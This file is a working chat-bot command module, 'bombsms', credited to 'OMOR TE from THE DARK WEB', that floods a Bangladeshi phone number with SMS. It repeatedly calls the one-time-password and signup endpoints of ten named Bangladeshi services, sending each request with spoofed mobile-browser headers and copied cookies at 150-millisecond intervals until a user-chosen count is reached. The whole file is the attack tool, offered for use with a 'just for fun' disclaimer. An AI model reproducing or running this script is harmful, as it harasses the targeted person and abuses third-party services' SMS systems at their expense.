const axios = require("axios");

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const bombingFlags = {};

module.exports = {
  config: {
    name: "bombsms",
    version: "5.0.0",
    author: "OMOR TE from THE DARK WEB",
    countDown: 0,
    role: 2,
    shortDescription: "SMS Bomber",
    longDescription: "Super-fast SMS bombing tool",
    guide: "{p}bombsms 01xxxxxxxxx limit | {p}bombsms off",
    category: "tool"
  },

  onStart: async function ({ message, event, args, api }) {
    const threadID = event.threadID;
    
    if (args[0] === "off") {
      if (bombingFlags[threadID]) {
        bombingFlags[threadID] = false;
        return message.reply("✅ SMS বোম্বার বন্ধ করা হয়েছে।");
      } else {
        return message.reply("❗ এই থ্রেডে কোনো বোম্বিং চলছিল না।");
      }
    }

    const num = args[0];
    const limitInput = args[1];
    
    if (!num || !limitInput) {
      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📌 ব্যবহার: bombsms 01xxxxxxxxx 50\n📌 বন্ধ: bombsms off\n━━━━━━━━━━━━━━━━━━━━\n⚠️ শুধু মজার জন্য ব্যবহার করুন`);
    }
    
    if (!/^01[0-9]{9}$/.test(num)) {
      return message.reply("❌ সঠিক বাংলাদেশি নাম্বার দিন (01xxxxxxxxx)");
    }
    
    const limit = parseInt(limitInput);
    if (isNaN(limit) || limit <= 0) {
      return message.reply("❌ সঠিক সংখ্যা দিন (যেমন: 50)");
    }
    
    if (bombingFlags[threadID]) {
      return message.reply("❗ বোম্বিং চলছে! বন্ধ করতে: bombsms off");
    }

    bombingFlags[threadID] = true;

    // First message at 0%
    const progressMsg = await message.reply(`🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n┣${"░".repeat(20)}┫\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`);

    // API configs
    const headers = {
      'authority': 'www.bioscopelive.com',
      'accept': '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.bioscopelive.com/en/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
    };
    
    const url1 = `https://www.bioscopelive.com/en/login/send-otp?phone=880${num}&operator=bd-otp`;
    
    const headers2 = {
      'referer': 'https://redx.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data1 = {
      'name': num,
      'phoneNumber': num,
      'service': 'redx',
    };
    
    const url2 = "https://api.redx.com.bd/v1/user/signup";
    
    const headers3 = {
      'authority': 'bikroy.com',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'bn',
      'application-name': 'web',
      'referer': 'https://bikroy.com/bn/users/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url3 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num;
    
    const headers4 = {
      'authority': 'www.ieatery.com.bd',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.ieatery.com.bd/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url4 = "https://www.ieatery.com.bd/otp-verify?phn=0" + num;
    
    const headers5 = {
      'referer': 'https://doctime.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data2 = {
      'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
      'code': '88',
      'contact_no': '0' + num,
      'country_calling_code': '88',
    };
    
    const headers6 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data3 = {
      'mobile': '+88-0' + num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
    };
    
    const headers7 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data4 = {
      'mobile': '+88-0' + num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
    };
    
    const headers8 = {
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https://hungrynaki.com',
      'Referer': 'https://hungrynaki.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'accept': '*/*',
      'content-type': 'application/json',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
    };
    
    const data8 = {
      'operationName': 'createOtp',
      'variables': {
        'phone': "" + num,
        'country': '880',
        'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
        'osVersionCode': 'Linux aarch64',
        'deviceBrand': 'Chrome',
        'deviceModel': '107',
        'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
      },
      'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
    };
    
    const cookies9 = {
      '_ga': 'GA1.3.1671188319.1677642641',
      '_gid': 'GA1.3.407134519.1677642641',
      '_gat_UA-146796176-2': '1',
      '_fbp': 'fb.2.1677642641903.2005162471',
      '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
    };
    
    const headers9 = {
      'authority': 'fundesh.com.bd',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'content-type': 'application/json; charset=UTF-8',
      'origin': 'https://fundesh.com.bd',
      'referer': 'https://fundesh.com.bd/fundesh/profile',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const params9 = {
      'service_key': '',
    };
    
    const json_data9 = {
      'msisdn': '' + num,
    };
    
    const headers10 = {
      'Accept': '*/*',
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https://ecourier.com.bd',
      'Referer': 'https://ecourier.com.bd/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
    };
    
    const url10 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0" + num;
    
    const cookieString = Object.entries(cookies9).map(([key, value]) => `${key}=${value}`).join('; ');
    
    const apiCalls = [
      async () => await axios.get(url1, { headers: headers }),
      async () => await axios.post(url2, data1, { headers: headers2 }),
      async () => await axios.get(url3, { headers: headers3 }),
      async () => await axios.get(url4, { headers: headers4 }),
      async () => await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 }),
      async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 }),
      async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers7 }),
      async () => await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 }),
      async () => await axios.post('https://fundesh.com.bd/api/auth/generateOTP', json_data9, {
        headers: { ...headers9, 'Cookie': cookieString },
        params: params9
      }),
      async () => await axios.get(url10, { headers: headers10 })
    ];
    
    // FAST SPEED - very little delay
    let sent = 0;
    let consecutiveFailures = 0;
    let lastUpdatePercent = 0;
    
    for (let cycle = 0; cycle < Math.ceil(limit / apiCalls.length) && sent < limit && bombingFlags[threadID]; cycle++) {
      for (let i = 0; i < apiCalls.length && sent < limit && bombingFlags[threadID]; i++) {
        try {
          const response = await apiCalls[i]();
          if (response && (response.status === 200 || response.status === 201)) {
            sent++;
            consecutiveFailures = 0;
            
            const newPercent = Math.floor((sent / limit) * 100);
            const updateThresholds = [25, 50, 75, 100];
            
            if (updateThresholds.includes(newPercent) && newPercent > lastUpdatePercent) {
              lastUpdatePercent = newPercent;
              const progressBar = getProgressBar(newPercent, 20);
              
              await api.editMessage(
                `🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${newPercent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`,
                progressMsg.messageID
              );
            }
          }
        } catch (error) {
          consecutiveFailures++;
        }
        
        // FAST: only 150ms delay (very fast)
        await sleep(150);
        
        if (!bombingFlags[threadID]) break;
      }
      
      if (consecutiveFailures > 30) {
        await api.editMessage(
          `⚠️ **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit reached\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n⏸️ Paused...`,
          progressMsg.messageID
        );
        break;
      }
      
      await sleep(300);
    }
    
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      const percent = Math.floor((sent / limit) * 100);
      const progressBar = getProgressBar(percent, 20);
      
      await api.editMessage(
        `✅ **SMS BOMBER COMPLETED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${percent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ MW LEGENDS`,
        progressMsg.messageID
      );
    } else {
      await api.editMessage(
        `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
        progressMsg.messageID
      );
    }
  }
};

function getProgressBar(percent, width) {
  const filled = Math.round((percent / 100) * width);
  const empty = width - filled;
  return `┣${"█".repeat(filled)}${"░".repeat(empty)}┫`;
}
